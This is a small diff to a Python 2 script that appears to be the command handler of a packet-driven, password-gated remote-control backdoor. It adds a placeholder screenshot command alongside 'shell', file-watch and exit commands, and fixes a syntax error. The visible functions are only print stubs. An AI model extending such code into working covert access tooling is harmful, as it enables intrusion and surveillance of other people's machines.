@@ -67,6 +67,9 @@ def watchAdd():
 def watchRemove():
     print "watchRemove"
 
+def screenshot():
+    print "screenshot"
+
 def exit():
     print "exit"
 
@@ -77,11 +80,13 @@ def parseCommand(packet):
             data = data[len(password):]
             commandType, commandString = data.split(' ', 1)
             if commandType == 'shell':
-                shellCommand(packet, commandString):
+                shellCommand(packet, commandString)
             elif commandType == 'watchAdd':
                 watchAdd()
             elif commandType == 'watchRemove':
                 watchRemove()
+            elif commandType == 'screenshot':
+                screenshot()
             elif commandType == 'exit':
                 exit()
             else:
